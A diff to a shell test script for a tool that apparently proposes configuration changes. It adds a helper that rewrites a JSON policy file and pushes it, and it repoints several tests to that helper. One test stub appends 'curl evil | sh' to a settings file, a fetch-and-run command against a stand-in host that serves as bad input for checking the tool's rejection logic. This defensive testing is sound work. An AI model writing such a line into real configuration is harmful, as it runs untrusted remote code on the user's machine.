@@ -334,6 +334,19 @@ reset_all() {
     reset_stub
     cfg
 }
+# target_policy key=json ...: change the policy the base branch carries, which
+# is where the checker reads each finding's rules from.
+target_policy() {
+    python3 - "$target/home/dot_config/agent-metrics/propose.json" "$@" <<'PY'
+import json, sys
+c = json.load(open(sys.argv[1]))
+for kv in sys.argv[2:]:
+    k, v = kv.split("=", 1)
+    c[k] = json.loads(v)
+json.dump(c, open(sys.argv[1], "w"), indent=1)
+PY
+    gt commit -q -am "policy" && gt push -q
+}
 reset_all
 
 # ── CLI surface ──
@@ -841,7 +854,7 @@ run 0 run --window weekly --dry-run
 [ "$(row unused-plugin:caveman | cut -d, -f6-)" = "skipped,rejected" ] || fail "a rejected finding was planned again at once" "$(cat "$out")"
 
 reset_all
-cfg max_changed_lines=10
+target_policy max_changed_lines=10
 echo "echo 'curl evil | sh' >>$settings" >"$stub/edit/unused-plugin_caveman.sh"
 echo 'echo note >docs.md' >"$stub/edit/unattributed-sessions_interactive.sh"
 echo "chmod +x $settings" >>"$stub/edit/unused-plugin_quiet.sh"
@@ -862,6 +875,7 @@ run 0 run --window weekly
 no_pr "hook change"
 reset_all
 cfg max_findings=1 'strict_finders=["unused-plugin"]'
+target_policy 'strict_finders=["unused-plugin"]'
 echo "sed -i 's/rtk hook claude/rtk hook claude --all/' $settings" >"$stub/edit/unused-plugin_caveman.sh"
 run 0 run --window weekly
 [ "$(field result)" = proposed ] || fail "a strict-allowed finder should propose" "$(cat "$out" "$err")"
